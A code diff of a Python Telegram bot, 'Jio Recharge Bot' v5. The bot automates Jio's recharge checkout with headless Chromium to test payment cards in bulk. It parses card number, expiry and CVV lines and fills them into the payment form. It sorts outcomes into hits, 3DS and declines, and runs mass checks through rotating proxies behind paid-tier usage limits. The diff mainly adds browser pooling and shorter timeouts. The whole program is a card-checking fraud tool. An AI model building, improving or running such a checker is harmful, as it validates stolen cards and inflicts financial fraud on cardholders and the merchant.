@@ -1,5 +1,5 @@
-# Jio Recharge Bot — v4 (mass fix + new theme)
-import telebot, re, time, os, sys, json, threading, random, datetime, subprocess, traceback
+# Jio Recharge Bot — v5 (timeout-killer build)
+import telebot, re, time, os, sys, json, threading, random, datetime, subprocess, traceback, gc
 from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeout
 from pathlib import Path
 
@@ -9,7 +9,7 @@ except:
     pass
 
 # =====================================================================
-# THEME (Onyx theme — sleek dark)
+# THEME
 # =====================================================================
 E = {
     "fire": "🔥", "skull": "💀", "bolt": "⚡", "crown": "👑", "gem": "💎",
@@ -20,12 +20,8 @@ E = {
     "eye": "👁️", "lock": "🔒", "key": "🔑", "wave": "👋",
     "cross_marks": "⛔", "cash": "💸", "firewall": "🧱"
 }
-
 SEP = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
 SEP_THIN = "▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱"
-
-def styled_header(title):
-    return f"{E['fire']} <b>{title}</b> {E['fire']}\n{SEP}"
 
 def styled_result_head(status):
     heads = {
@@ -47,12 +43,10 @@ def styled_result_head(status):
     }
     return heads.get(status, f"{E['warn']} <b>UNKNOWN</b>")
 
-# backward compat alias
-def status_head(status):
-    return styled_result_head(status)
+status_head = styled_result_head
 
 # =====================================================================
-# CHROMIUM — verify once
+# CHROMIUM LOCATION
 # =====================================================================
 _CHROMIUM_READY = threading.Event()
 _CHROMIUM_PATH = {"path": None}
@@ -104,14 +98,11 @@ def _verify_chromium_once():
 
     def installer():
         print("[BOOT] Installing Chromium...")
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "playwright"], timeout=300)
+        try: subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "playwright"], timeout=300)
         except: pass
-        try:
-            subprocess.check_call([sys.executable, "-m", "playwright", "install-deps", "chromium"], timeout=300)
+        try: subprocess.check_call([sys.executable, "-m", "playwright", "install-deps", "chromium"], timeout=300)
         except: pass
-        try:
-            subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
+        try: subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
         except Exception as e:
             print(f"[BOOT] install failed: {str(e)[:120]}")
             return
@@ -120,20 +111,103 @@ def _verify_chromium_once():
             _CHROMIUM_PATH["path"] = found
             _CHROMIUM_READY.set()
             print(f"[BOOT] Chromium ready: {found}")
-        else:
-            try:
-                from playwright.sync_api import sync_playwright
-                with sync_playwright() as p:
-                    path = p.chromium.executable_path
-                    if path and Path(path).exists():
-                        _CHROMIUM_PATH["path"] = path
-                        _CHROMIUM_READY.set()
-                        print(f"[BOOT] Chromium ready: {path}")
-            except Exception as e:
-                print(f"[BOOT] recheck failed: {e}")
+
     threading.Thread(target=installer, daemon=True).start()
 
 threading.Thread(target=_verify_chromium_once, daemon=True).start()
+
+# =====================================================================
+# ZOMBIE CLEANUP
+# =====================================================================
+def _kill_zombie_browsers():
+    try:
+        subprocess.run(["pkill", "-9", "-f", "chrome-linux/chrome"], timeout=10, capture_output=True)
+        subprocess.run(["pkill", "-9", "-f", "headless_shell"], timeout=10, capture_output=True)
+    except: pass
+
+def _zombie_cleanup_loop():
+    while True:
+        time.sleep(600)  # 10 min
+        _kill_zombie_browsers()
+        gc.collect()
+
+threading.Thread(target=_zombie_cleanup_loop, daemon=True).start()
+
+# =====================================================================
+# BROWSER POOL — one browser, many pages (memory efficient)
+# =====================================================================
+class BrowserPool:
+    """Singleton browser reuse across checks. Kills timeout issues."""
+
+    def __init__(self):
+        self._lock = threading.Lock()
+        self._playwright = None
+        self._browser = None
+        self._ctx = None
+
+    def _start(self):
+        """Start playwright + browser if not running."""
+        from playwright.sync_api import sync_playwright
+        if self._playwright is None:
+            self._playwright = sync_playwright().start()
+        if self._browser is None or not self._browser.is_connected():
+            exe = _CHROMIUM_PATH.get("path") or _find_chromium()
+            launch_kwargs = {
+                "headless": True,
+                "args": [
+                    "--no-sandbox",
+                    "--disable-dev-shm-usage",
+                    "--disable-gpu",
+                    "--disable-software-rasterizer",
+                    "--disable-extensions",
+                    "--disable-background-networking",
+                    "--disable-sync",
+                    "--disable-translate",
+                    "--no-first-run",
+                    "--no-default-browser-check",
+                    "--disable-setuid-sandbox",
+                    "--disable-accelerated-2d-canvas",
+                    "--disable-accelerated-video-decode",
+                    "--disable-features=TranslateUI,BlinkGenPropertyTrees,IsolateOrigins,site-per-process",
+                    "--memory-pressure-off",
+                ],
+                "timeout": 90000,  # 90s max (from start)
+            }
+            if exe and Path(exe).exists():
+                launch_kwargs["executable_path"] = exe
+            try:
+                self._browser = self._playwright.chromium.launch(**launch_kwargs)
+                print("[POOL] Browser launched")
+            except Exception as e:
+                # fallback — try install
+                print(f"[POOL] Launch failed: {str(e)[:120]}")
+                try: subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
+                except: pass
+                launch_kwargs.pop("executable_path", None)
+                self._browser = self._playwright.chromium.launch(**launch_kwargs)
+                print("[POOL] Browser launched (after install)")
+
+    def get_context(self):
+        """Return a fresh isolated context (cookies/cache clean)."""
+        with self._lock:
+            self._start()
+            ctx = self._browser.new_context(
+                viewport={"width": 1366, "height": 768},
+                user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                            "AppleWebKit/537.36 (KHTML, like Gecko) "
+                            "Chrome/120.0.0.0 Safari/537.36"),
+            )
+            return ctx
+
+    def reset(self):
+        """Force close and restart browser."""
+        with self._lock:
+            try:
+                if self._browser: self._browser.close()
+            except: pass
+            self._browser = None
+
+_pool = BrowserPool()
 
 # =====================================================================
 # JIO CORE
@@ -150,29 +224,6 @@ def _page_text(page):
     try: text = page.locator("body").inner_text(timeout=4000)
     except: text = ""
     return re.sub(r"\s+", " ", text).strip()
-
-def _launch_browser(pw, launch_kwargs):
-    try:
-        return pw.chromium.launch(**launch_kwargs)
-    except Exception as e:
-        err = str(e).lower()
-        if not any(k in err for k in ["executable doesn't exist","executable not found",
-                                       "please run the following command","host system is missing"]):
-            raise
-    cached = _CHROMIUM_PATH.get("path")
-    if cached and Path(cached).exists():
-        launch_kwargs["executable_path"] = cached
-        try: return pw.chromium.launch(**launch_kwargs)
-        except: pass
-    found = _find_chromium()
-    if found:
-        launch_kwargs["executable_path"] = found
-        try: return pw.chromium.launch(**launch_kwargs)
-        except: pass
-    try: subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
-    except: pass
-    launch_kwargs.pop("executable_path", None)
-    return pw.chromium.launch(**launch_kwargs)
 
 def luhn_check_digit(pan):
     d=[int(x) for x in pan]; d.reverse(); t=0
@@ -208,28 +259,29 @@ def parse_card_line(line):
 def card_label(card):
     return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"
 
+
 def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
-    from playwright.sync_api import sync_playwright
-    if deadline is None: deadline = time.time() + 220
+    """Uses browser pool. Returns (status, message, url, meta)."""
+    if deadline is None: deadline = time.time() + 180
     meta = {"merchant":"Jio Recharge","amount":amount,"plan":""}
 
-    p = sync_playwright()
-    pw = p.start()
-    launch_kwargs = {"headless": headless}
-    if proxy: launch_kwargs["proxy"] = proxy
-
+    ctx = None
     try:
-        browser = _launch_browser(pw, launch_kwargs)
+        ctx = _pool.get_context()
     except Exception as e:
-        try: pw.stop()
-        except: pass
-        return "error", f"Browser launch failed: {str(e)[:150]}", "", meta
+        # pool failed — try reset + retry once
+        print(f"[jio] Pool context failed: {str(e)[:120]}")
+        _pool.reset()
+        try:
+            ctx = _pool.get_context()
+        except Exception as e2:
+            return "error", f"Browser pool failed: {str(e2)[:120]}", "", meta
 
-    page = browser.new_page()
+    page = ctx.new_page()
     try:
         page.goto("https://www.jio.com/selfcare/recharge/mobility",
-                  wait_until="domcontentloaded", timeout=60000)
-        page.wait_for_timeout(3000)
+                  wait_until="domcontentloaded", timeout=45000)
+        page.wait_for_timeout(2500)
         frame = page.main_frame
         callback = {}
         def _capture_cb(req):
@@ -268,12 +320,12 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
         if not pay_url.get("url"):
             return "error", f"Could not generate payment link.", page.url, meta
 
-        try: page.goto(pay_url["url"], wait_until="domcontentloaded", timeout=60000)
+        try: page.goto(pay_url["url"], wait_until="domcontentloaded", timeout=45000)
         except: pass
-        page.wait_for_timeout(3000)
-        try: page.wait_for_url("**pay.jio.com**", timeout=30000)
+        page.wait_for_timeout(2500)
+        try: page.wait_for_url("**pay.jio.com**", timeout=25000)
         except: pass
-        page.wait_for_timeout(2000)
+        page.wait_for_timeout(1500)
 
         pf = page.main_frame
         clicked_card = False
@@ -286,8 +338,8 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
               if(el.click){el.click();return true;}return false;
             }""")
             if clicked_card: break
-            page.wait_for_timeout(1000)
-        page.wait_for_timeout(4000)
+            page.wait_for_timeout(800)
+        page.wait_for_timeout(3000)
 
         for _ in range(20):
             if "add-new-card" in page.url or "saved-cards" in page.url: break
@@ -301,8 +353,8 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
                   let n=el;for(let i=0;i<8&&n;i++){if(/j-listBlock\\b|align-middle/.test((n.className||'').toString())&&n.offsetParent!==null){n.click();return true;}n=n.parentElement;}
                   if(el.click){el.click();return true;}return false;
                 }""")
-            page.wait_for_timeout(1000)
-        page.wait_for_timeout(2000)
+            page.wait_for_timeout(800)
+        page.wait_for_timeout(1500)
         pf = page.main_frame
 
         def fresh():
@@ -312,7 +364,7 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
         def fill(name, val):
             try:
                 loc = pf.locator(f"input[name='{name}']")
-                if loc.count(): loc.first.fill(val, timeout=4000)
+                if loc.count(): loc.first.fill(val, timeout=3000)
             except: fresh()
 
         pan = card.get("pan","").replace(" ","")
@@ -324,15 +376,15 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
                 fill("CVV", card.get("cvv",""))
                 fill("Name on the card", "Card Holder")
             except: fresh()
-            page.wait_for_timeout(500)
+            page.wait_for_timeout(400)
             try:
                 got = pf.locator("input[name='Card number']").first.input_value() \
                     if pf.locator("input[name='Card number']").count() else ""
                 if got and got.replace(" ","")[:6] == pan[:6]: break
             except: fresh()
 
-        page.keyboard.press("Tab"); page.wait_for_timeout(500)
-        page.keyboard.press("Tab"); page.wait_for_timeout(4000)
+        page.keyboard.press("Tab"); page.wait_for_timeout(400)
+        page.keyboard.press("Tab"); page.wait_for_timeout(3000)
 
         for _ in range(10):
             try:
@@ -342,8 +394,8 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
                 }""")
                 if clicked: break
             except: fresh()
-            page.wait_for_timeout(1000)
-        page.wait_for_timeout(4000)
+            page.wait_for_timeout(800)
+        page.wait_for_timeout(3000)
         fresh()
 
         try:
@@ -353,24 +405,24 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
               if(el){let n=el;for(let i=0;i<6&&n;i++){if(n.click){n.click();break;}n=n.parentElement;}}
             }""")
         except: pf = page.main_frame
-        page.wait_for_timeout(3000)
+        page.wait_for_timeout(2500)
 
         for _ in range(20):
             u = page.url
             if "cardinalcommerce" in u or "3dsecure" in u.lower(): break
             if "paytm" in u or "payglocal" in u: break
             if "easebuzz" in u or "acs" in u:
-                page.wait_for_timeout(1000); continue
-            page.wait_for_timeout(1000)
+                page.wait_for_timeout(800); continue
+            page.wait_for_timeout(800)
 
         if "payglocal" in page.url:
             for _ in range(10):
                 try:
                     pgf = page.main_frame
                     ziploc = pgf.locator("#gl_billing_addressPostalCode")
-                    if ziploc.count(): ziploc.first.fill("10080", timeout=3000); break
+                    if ziploc.count(): ziploc.first.fill("10080", timeout=2500); break
                 except: pass
-                page.wait_for_timeout(1000)
+                page.wait_for_timeout(800)
             for _ in range(10):
                 try:
                     pgf = page.main_frame
@@ -380,8 +432,8 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
                       if(b){b.click();return true;}return false;
                     }"""): break
                 except: pass
-                page.wait_for_timeout(1000)
-            page.wait_for_timeout(4000)
+                page.wait_for_timeout(800)
+            page.wait_for_timeout(3000)
 
         if "paytm" in page.url and "selectCurrency" in page.url:
             for _ in range(12):
@@ -391,19 +443,19 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
                   if(el){let n=el;for(let i=0;i<8&&n;i++){if(n.click&&n.offsetParent!==null){n.click();break;}n=n.parentElement;}return true;}
                   return false;
                 }"""): break
-                page.wait_for_timeout(1000)
-            page.wait_for_timeout(2000)
+                page.wait_for_timeout(800)
+            page.wait_for_timeout(1500)
             for _ in range(5):
                 if pf.evaluate("""() => {
                   const b=[...document.querySelectorAll('button')].find(e=>/Proceed|Pay|Continue|Make Payment/i.test((e.innerText||'').trim())&&!e.disabled);
                   if(b){b.click();return true;}return false;
                 }"""): break
-                page.wait_for_timeout(1000)
-            page.wait_for_timeout(3000)
+                page.wait_for_timeout(800)
+            page.wait_for_timeout(2500)
 
         stalled = 0
-        for i in range(34):
-            page.wait_for_timeout(1500)
+        for i in range(30):
+            page.wait_for_timeout(1200)
             u = page.url
             if callback.get("url"):
                 em = re.search(r"errorMessage=([^&]*)", callback["url"])
@@ -417,7 +469,7 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
             if "cardinalcommerce" in u or "3dsecure" in u.lower(): return "requires_action", "3DS required.", u, meta
             if "3ds2" in u or "instaproxy" in u:
                 for _ in range(4):
-                    page.wait_for_timeout(1500)
+                    page.wait_for_timeout(1200)
                     if callback.get("url"): break
                     if "instaproxy" not in page.url and "3ds2" not in page.url: break
                 if callback.get("url"): continue
@@ -440,8 +492,8 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
                         _three_ds = True; break
                 if _three_ds:
                     resolved = False
-                    for _ in range(14):
-                        page.wait_for_timeout(1500)
+                    for _ in range(12):
+                        page.wait_for_timeout(1200)
                         cu = page.url; clow = _page_text(page).lower()
                         if "payglocal" in cu and "retry" in cu: return "failed", "Declined.", page.url, meta
                         if any(w in clow for w in ("payment unsuccessful","was not successful","could not process",
@@ -474,9 +526,9 @@ def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
     except Exception as exc:
         return "error", f"Checkout failed: {str(exc)[:150]}", page.url, meta
     finally:
-        try: browser.close()
+        try: page.close()
         except: pass
-        try: p.stop()
+        try: ctx.close()
         except: pass
 
 # =====================================================================
@@ -496,7 +548,7 @@ PROXY_FILE = 'JioData/proxies.txt'
 ADMIN_LIMIT = 50
 PREMIUM_LIMIT = 15
 FREE_LIMIT = 0
-WORKERS = 2
+WORKERS = 1
 
 ACTIVE_JOBS = {}
 ACTIVE_USERS_MPP = {}
@@ -624,11 +676,7 @@ def classify(st, dt):
             st = "processor_error"
     return st, dt
 
-# =====================================================================
-# MASS CHECK — sequential-ish, respects stop, no crashes
-# =====================================================================
-def run_one_check(phone, amount, card, proxy_str=None, timeout=240):
-    """Isolated check. Always returns (status, message)."""
+def run_one_check(phone, amount, card, proxy_str=None, timeout=180):
     proxy = proxy_dict(proxy_str) if proxy_str else None
     try:
         with ThreadPoolExecutor(max_workers=1) as ex:
@@ -636,9 +684,13 @@ def run_one_check(phone, amount, card, proxy_str=None, timeout=240):
             try:
                 res = future.result(timeout=timeout)
             except FuturesTimeout:
+                # reset pool on timeout
+                _pool.reset()
                 return "error", f"Timeout"
             except Exception as te:
-                if "timeout" in str(te).lower(): return "error", f"Timeout"
+                if "timeout" in str(te).lower():
+                    _pool.reset()
+                    return "error", f"Timeout"
                 raise
     except Exception as e:
         return "error", f"Failed: {str(e)[:120]}"
@@ -653,7 +705,6 @@ def run_one_check(phone, amount, card, proxy_str=None, timeout=240):
     try: return classify(st, dt)
     except: return "error", "Classify failed"
 
-# backward alias
 run_check = run_one_check
 
 # =====================================================================
@@ -691,7 +742,6 @@ def proxy_command(message):
             f"┣ {E['check']} Added ➜ {len(new)}\n"
             f"┗ 🔄 Duplicate ➜ {len(add_list)-len(new)}",
             parse_mode="HTML")
-
     elif cmd == 'remove':
         if not arg: bot.reply_to(message, f"{E['box']} /proxy remove index/all", parse_mode="HTML"); return
         if not os.path.exists(PROXY_FILE): bot.reply_to(message, f"{E['cross']} No proxies", parse_mode="HTML"); return
@@ -705,7 +755,6 @@ def proxy_command(message):
             removed = proxies.pop(idx-1); save_proxies(proxies)
             bot.reply_to(message, f"{E['check']} Removed ➜ {removed}\n{E['box']} Remaining ➜ {len(proxies)}", parse_mode="HTML")
         except: bot.reply_to(message, f"{E['box']} /proxy remove index/all", parse_mode="HTML")
-
     elif cmd == 'list':
         if not proxy_list: bot.reply_to(message, f"{E['cross']} No proxies", parse_mode="HTML"); return
         lines = [f"{E['chart']} <b>Proxies ({len(proxy_list)})</b>", SEP_THIN]
@@ -802,9 +851,9 @@ def jio_single(message):
     t.start()
 
     stages = [
-        (5,"Step 1/5","Launching browser"),(15,"Step 2/5","Loading Jio page"),
-        (30,"Step 3/5","Fetching plans"),(50,"Step 4/5","Filling card form"),
-        (80,"Step 5/5","Submitting payment"),(120,"Step 5/5","Awaiting bank response"),
+        (3,"Step 1/5","Launching browser"),(10,"Step 2/5","Loading Jio page"),
+        (20,"Step 3/5","Fetching plans"),(35,"Step 4/5","Filling card form"),
+        (55,"Step 5/5","Submitting payment"),(80,"Step 5/5","Awaiting bank response"),
     ]
     start_t = time.time(); shown = set()
     while t.is_alive():
@@ -931,8 +980,7 @@ def mjio_mass(message):
     prog = bot.reply_to(message, cap(), parse_mode="HTML", reply_markup=mkup())
 
     def worker(card, proxy):
-        if not ACTIVE_JOBS.get(job_id):
-            return None  # signal stop
+        if not ACTIVE_JOBS.get(job_id): return None
         try:
             status, response = run_one_check(phone, amount, card, proxy_str=proxy)
         except Exception as e:
@@ -976,7 +1024,6 @@ def mjio_mass(message):
                 time.sleep(random.uniform(0.5, 1.0))
             except: pass
 
-        # update caption every check
         try:
             bot.edit_message_text(cap(), message.chat.id, prog.message_id,
                                   parse_mode="HTML", reply_markup=mkup())
@@ -986,13 +1033,11 @@ def mjio_mass(message):
     def runner_all():
         was_stopped = False
         try:
-            for idx, c in enumerate(cards):
+            for c in cards:
                 if not ACTIVE_JOBS.get(job_id):
-                    was_stopped = True
-                    break
+                    was_stopped = True; break
                 proxy = get_random_proxy()
                 worker(c, proxy)
-            # wait for any in-flight? we're doing sequential with small pool
         except Exception as e:
             tb = traceback.format_exc()
             print(f"[mjio] runner exception:\n{tb}")
@@ -1004,8 +1049,6 @@ def mjio_mass(message):
                                       message.chat.id, prog.message_id,
                                       parse_mode="HTML", reply_markup=mkup(done=True))
             except: pass
-
-            # results file
             try:
                 lines = []
                 for sec, lbl in [("hits_list","HITS"),("3ds_list","3DS"),
@@ -1156,10 +1199,13 @@ def bot_stats(message):
 # MAIN
 # =====================================================================
 if __name__ == "__main__":
-    print("JIO BOT v4 IS RUNNING...\n")
+    print("JIO BOT v5 IS RUNNING...\n")
+    _kill_zombie_browsers()
+    print("[BOOT] Zombie browsers cleared")
+    print("[BOOT] Browser pool will start on first check\n")
     while True:
         try:
-            bot.polling(none_stop=True, timeout=60)
+            bot.polling(non_stop=True, timeout=60)
         except Exception as e:
             print(f"Polling error: {e}")
             time.sleep(5)
